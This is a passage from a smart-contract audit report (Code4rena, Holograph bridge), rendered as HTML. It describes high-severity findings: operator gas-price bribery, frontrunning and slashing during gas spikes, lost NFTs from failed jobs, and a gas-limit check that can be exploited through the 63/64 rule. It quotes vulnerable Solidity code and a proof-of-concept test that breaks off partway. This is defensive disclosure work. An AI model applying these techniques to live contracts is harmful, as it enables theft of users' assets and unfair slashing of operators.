fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual audit, flashbot docs</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Do not use current tx.gasprice amount to infer gas price in a previous block.<br>\nProbably best to use gas price oracle.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/473#issuecomment-1297061061\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Note that this is not possible with 1559 due to block base fee, but might be possible in some other chain.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/473#issuecomment-1306625799\">alexanderattar (Holograph) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>EIP-1559 does not allow for tx gas less than block base fee</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/473#issuecomment-1306728092\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Dispute: it is incorrect to assume bridge request sender did not add a priority fee, making it possible to bribe with <code>tx.gasprice &#x3C; gasPrice</code>.<br>\nAlso, cannot assume all chains in the multichain implement EIP1559.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/473#issuecomment-1308918221\">ACC01ADE (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>The EIP-1559 for all EVM chains assumption is the gotcha here. I don’t really see a solution for this at the moment. 🤔 </p>\n</blockquote>\n<hr>\n<h2 id=\"h-06-gas-price-spikes-cause-the-selected-operator-to-be-vulnerable-to-frontrunning-and-be-slashed\" style=\"position:relative;\"><a href=\"#h-06-gas-price-spikes-cause-the-selected-operator-to-be-vulnerable-to-frontrunning-and-be-slashed\" aria-label=\"h 06 gas price spikes cause the selected operator to be vulnerable to frontrunning and be slashed permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/44\">[H-06] Gas price spikes cause the selected operator to be vulnerable to frontrunning and be slashed</a></h2>\n<p><em>Submitted by Chom, also found by Lambda and Trust</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L354\">HolographOperator.sol#L354</a><br></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gasPrice</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">tx</span><span class=\"mtk1\">.</span><span class=\"mtk12\">gasprice</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;HOLOGRAPH: gas spike detected&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">         * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> select operator that failed to do the job, is slashed the pod base fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">         */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_bondedAmounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">job</span><span class=\"mtk1\">.</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">] -= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">         * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> the slashed amount is sent to current operator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">         */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_bondedAmounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Since you have designed a mechanism to prevent other operators to slash the operator due to “the selected missed the time slot due to a gas spike”. It can induce that operators won’t perform their job if a gas price spike happens due to negative profit.</p>\n<p>But your designed mechanism has a vulnerability. Other operators can submit their transaction to the mempool and queue it using <code>gasPrice in bridgeInRequestPayload</code>. It may get executed before the selected operator as the selected operator is waiting for the gas price to drop but doesn’t submit any transaction yet. If it doesn’t, these operators lose a little gas fee. But a slashed reward may be greater than the risk of losing a little gas fee.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">timeDifference</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;HOLOGRAPH: operator has time&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Once 1 epoch has passed, selected operator is vulnerable to slashing and frontrunning.</p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Modify your operator node software to queue transactions immediately with <code>gasPrice in bridgeInRequestPayload</code> if a gas price spike happened. Or allow gas fee loss tradeoff to prevent being slashed.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/44#issuecomment-1307886755\">alexanderattar (Holograph) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Valid, we have not fully finalized this mechanism and will consider mitigation strategies.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/44#issuecomment-1320927380\">gzeon (judge) increased severity to High and commented</a>:</strong></p>\n<blockquote>\n<p>High risk because potential slashing.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-07-failed-job-cant-be-recovered-nft-may-be-lost\" style=\"position:relative;\"><a href=\"#h-07-failed-job-cant-be-recovered-nft-may-be-lost\" aria-label=\"h 07 failed job cant be recovered nft may be lost permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/102\">[H-07] Failed job can’t be recovered. NFT may be lost.</a></h2>\n<p><em>Submitted by Chom, also found by 0x52, 0xA5DF, adriro, and ladboy233</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L329\">HolographOperator.sol#L329</a><br>\n<a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L419-L429\">HolographOperator.sol#L419-L429</a><br></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">executeJob</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bridgeInRequestPayload</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_operatorJobs</span><span class=\"mtk1\">[</span><span class=\"mtk12\">hash</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">try</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">HolographOperatorInterface</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">nonRevertingBridgeCall</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bridgeInRequestPayload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">/// @dev do nothing</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">catch</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_failedJobs</span><span class=\"mtk1\">[</span><span class=\"mtk12\">hash</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FailedOperatorJob</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hash</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>First, it will <code>delete _operatorJobs[hash];</code> to have it not replayable.</p>\n<p>Next, assume <code>nonRevertingBridgeCall</code> failed. NFT won’t be minted and the catch block is entered.</p>\n<p><code>_failedJobs[hash]</code> is set to true and event is emitted</p>\n<p>Notice that <code>_operatorJobs[hash]</code> has been deleted, so this job is not replayable. This mean NFT is lost forever since we can’t retry executeJob.</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Move <code>delete _operatorJobs[hash];</code> to the end of function executeJob covered in <code>if (!_failedJobs[hash])</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">_failedJobs</span><span class=\"mtk1\">[</span><span class=\"mtk12\">hash</span><span class=\"mtk1\">]) </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_operatorJobs</span><span class=\"mtk1\">[</span><span class=\"mtk12\">hash</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span></code></pre>\n<p>But this implementation is not safe. The selected operator may get slashed. Additionally, you may need to check <code>_failedJobs</code> flag to allow retry for only the selected operator.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/102#issuecomment-1296298124\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>While the use of non-blocking call is good to unstuck operator, consider making the failed job still executable by anyone (so the user can e.g. use a higher gas limit) to avoid lost fund. Kinda like how Arbitrum retryable ticket works. Can be high risk due to asset lost.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/102#issuecomment-1296346691\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>I think it’s a design choice to make it not replayable. Sponsor discussed having a refund mechanism at the source chain, if we were to leave it replayable the refunding could lead to double mint attack.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/102#issuecomment-1307872286\">alexanderattar (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>This is a valid point and the desired code is planned but wasn’t implemented in time for the audit. We will add logic to handle this case.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/102#issuecomment-1320929853\">gzeon (judge) increased severity to High and commented</a>:</strong></p>\n<blockquote>\n<p>Since asset can be lost, I think it is fair to judge this as High risk.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/102#issuecomment-1351772822\">alexanderattar (Holograph) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>We have a fix for this: <a href=\"https://github.com/holographxyz/holograph-protocol/pull/98/files#diff-552f4c851fa3089f9c8efd33a2f10681bc27743917bb63000a5d19d5b41e0d3f\">https://github.com/holographxyz/holograph-protocol/pull/98/files#diff-552f4c851fa3089f9c8efd33a2f10681bc27743917bb63000a5d19d5b41e0d3f</a></p>\n</blockquote>\n<hr>\n<h2 id=\"h-08-gas-limit-check-is-inaccurate-leading-to-an-operator-being-able-to-fail-a-job-intentionally\" style=\"position:relative;\"><a href=\"#h-08-gas-limit-check-is-inaccurate-leading-to-an-operator-being-able-to-fail-a-job-intentionally\" aria-label=\"h 08 gas limit check is inaccurate leading to an operator being able to fail a job intentionally permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/176\">[H-08] Gas limit check is inaccurate, leading to an operator being able to fail a job intentionally</a></h2>\n<p><em>Submitted by 0xA5DF, also found by Trust and V_B</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L316\">HolographOperator.sol#L316</a><br></p>\n<p>There’s a check at line 316 that verifies that there’s enough gas left to execute the <code>HolographBridge.bridgeInRequest()</code> with the <code>gasLimit</code> set by the user, however the actual amount of gas left during the call is less than that (mainly due to the <code>1/64</code> rule, see below).<br>\nAn attacker can use that gap to fail the job while still having the <code>executeJob()</code> function complete.</p>\n<h3 id=\"impact-4\" style=\"position:relative;\"><a href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The owner of the bridged token would loose access to the token since the job failed.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Besides using a few units of gas between the check and the actual call, there’s also a rule that only 63/64 of the remaining gas would be dedicated to an (external) function call. Since there are 2 external function calls done (<code>nonRevertingBridgeCall()</code> and the actual call to the bridge) <code>~2/64</code> of the gas isn’t sent to the bridge call and can be used after the bridge call runs out of gas.</p>\n<p>The following PoC shows that if the amount of gas left before the call is at least 1 million then the execution can continue after the bridge call fails:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: UNLICENSED</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;forge-std/Test.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ContractTest</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Test</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FailedOperatorJob</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">jobHash</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_inboundMessageCounter</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_failedJobs</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_inboundMessageCounter</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">5</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testGas64</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">this</span><span class=\"mtk1\">.</span><span class=\"mtk12\">entryPoint</span><span class=\"mtk1\">{gas:</span><span class=\"mtk7\">1000000</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Bridge</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bridge</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Bridge</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">GasLeftAfterFail</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">left</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">entryPoint</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">console2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Gas left before call: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk11\">gasleft</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hash</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0x987744358512a04274ccfb3d9649da3c116cd6b19c535e633ef8529a80cb06a0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">try</span><span class=\"mtk1\"> </span><span class=\"mtk4\">this</span><span class=\"mtk1\">.</span><span class=\"mtk11\">intermediate</span><span class=\"mtk1\">(){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span><span class=\"mtk15\">catch</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// check out how much gas is left after the call to the bridge failed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">console2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Gas left after failure: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk11\">gasleft</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// simulate operations done after failure</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_failedJobs</span><span class=\"mtk1\">[</span><span 